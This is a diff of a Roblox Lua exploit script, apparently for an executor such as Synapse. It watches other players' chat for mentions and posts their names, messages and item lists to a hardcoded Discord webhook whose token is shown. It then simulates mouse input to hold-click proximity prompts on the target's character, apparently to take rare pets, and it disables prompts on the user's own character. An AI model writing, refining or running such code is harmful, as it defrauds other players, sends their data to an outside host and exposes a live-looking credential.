@@ -1,15 +1,16 @@
+-- Services
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 local VirtualInputManager = game:GetService("VirtualInputManager")
-local TeleportService = game:GetService("TeleportService")
 
+-- Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 
--- Fix 1: Added proper error handling for webhook
+-- Webhook function with proper error handling
 local function sendWebhook(content, embed)
     local payload = {
         content = content,
@@ -17,7 +18,7 @@ local function sendWebhook(content, embed)
     }
     
     local success, err = pcall(function()
-        local jsonPayload = HttpService:JSONEncode(payload)
+        local json = HttpService:JSONEncode(payload)
         if syn and syn.request then
             syn.request({
                 Url = WEBHOOK_URL,
@@ -25,33 +26,49 @@ local function sendWebhook(content, embed)
                 Headers = {
                     ["Content-Type"] = "application/json"
                 },
-                Body = jsonPayload
+                Body = json
+            })
+        elseif request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = json
             })
         else
-            HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
+            HttpService:PostAsync(WEBHOOK_URL, json)
         end
     end)
     
     if not success then
-        warn("Webhook failed: "..tostring(err))
+        warn("Webhook failed:", err)
     end
 end
 
--- Fix 2: Proper character wait function
-local function waitForCharacter(player)
-    if not player.Character then
-        player.CharacterAdded:Wait()
+-- Get player character safely
+local function getCharacter(player)
+    if player.Character then
+        return player.Character
     end
+    
+    local charAdded
+    charAdded = player.CharacterAdded:Connect(function(char)
+        charAdded:Disconnect()
+    end)
+    
+    player.CharacterAdded:Wait()
     return player.Character
 end
 
--- Fix 3: Better prompt finding with validation
-local function findPrompt(targetChar)
-    if not targetChar then return nil end
-    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
-    if not humanoidRootPart then return nil end
+-- Find the proximity prompt on HumanoidRootPart
+local function findPrompt(character)
+    if not character then return nil end
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if not root then return nil end
     
-    for _, child in pairs(humanoidRootPart:GetChildren()) do
+    for _, child in pairs(root:GetChildren()) do
         if child:IsA("ProximityPrompt") and child.Enabled then
             return child
         end
@@ -59,45 +76,44 @@ local function findPrompt(targetChar)
     return nil
 end
 
--- Fix 4: Precise clicking with position validation
+-- Precise prompt clicking
 local function clickPrompt(prompt)
     if not prompt or not prompt.Parent then return false end
     
-    local promptPart = prompt.Parent
+    local part = prompt.Parent
     local startTime = os.clock()
     
-    -- Get screen position with validation
-    local screenPos, visible = Camera:WorldToScreenPoint(promptPart.Position)
+    -- Get screen position
+    local screenPos, visible = Camera:WorldToScreenPoint(part.Position)
     if not visible then return false end
     
-    -- Adjusted target position for prompt click
+    -- Adjust for prompt position (center of screen)
     local targetPos = Vector2.new(
         screenPos.X,
-        screenPos.Y - 35 -- Vertical offset for prompt
+        screenPos.Y - 40 -- Vertical offset for prompt
     )
     
     -- Smooth mouse movement
-    for i = 1, 5 do
-        local t = i/5
-        local currentPos = Vector2.new(
-            (i-1)/5 * targetPos.X,
-            (i-1)/5 * targetPos.Y
+    for i = 1, 8 do
+        local t = i/8
+        local newPos = Vector2.new(
+            targetPos.X * t,
+            targetPos.Y * t
         )
-        local newPos = currentPos:Lerp(targetPos, t)
         VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
-        task.wait(0.1)
+        task.wait(0.05)
     end
     
     -- Click and hold
     VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
     
     -- Maintain position during hold
-    while os.clock() - startTime < prompt.HoldDuration + 0.3 do
-        screenPos = Camera:WorldToScreenPoint(promptPart.Position)
-        if not screenPos then break end
-        
-        targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
-        VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
+    while os.clock() - startTime < prompt.HoldDuration + 0.2 do
+        screenPos = Camera:WorldToScreenPoint(part.Position)
+        if screenPos then
+            targetPos = Vector2.new(screenPos.X, screenPos.Y - 40)
+            VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
+        end
         task.wait(0.05)
     end
     
@@ -105,10 +121,10 @@ local function clickPrompt(prompt)
     return true
 end
 
--- Fix 5: Proper target interaction with checks
+-- Interact with target player
 local function interactWithTarget(target)
-    local targetChar = waitForCharacter(target)
-    local myChar = waitForCharacter(LocalPlayer)
+    local targetChar = getCharacter(target)
+    local myChar = getCharacter(LocalPlayer)
     
     if not targetChar or not myChar then return end
     
@@ -126,7 +142,7 @@ local function interactWithTarget(target)
     end
 end
 
--- Fix 6: Improved mention detection
+-- Handle player chat messages
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     
@@ -146,9 +162,9 @@ local function onPlayerChatted(player, message)
         table.insert(items, item.Name)
     end
     
-    -- Create embed
+    -- Create webhook embed
     local embed = {
-        title = "🎯 Mention from "..player.Name,
+        title = "🚨 Mention from "..player.Name,
         description = "**Message:** ```"..message.."```",
         color = 0xFFA500,
         fields = {
@@ -164,8 +180,8 @@ local function onPlayerChatted(player, message)
     interactWithTarget(player)
 end
 
--- Fix 7: Proper initialization
-local function initialize()
+-- Initialize the script
+local function init()
     -- Setup chat listeners
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer then
@@ -197,10 +213,14 @@ local function initialize()
         disablePrompts(LocalPlayer.Character)
     end
     LocalPlayer.CharacterAdded:Connect(disablePrompts)
+    
+    print("Script initialized successfully!")
 end
 
--- Fix 8: Error protected execution
-local success, err = pcall(initialize)
+-- Start the script with error protection
+local success, err = pcall(init)
 if not success then
-    warn("Initialization failed: "..tostring(err))
+    warn("Script failed to initialize:", err)
+else
+    print("Script is running!")
 end
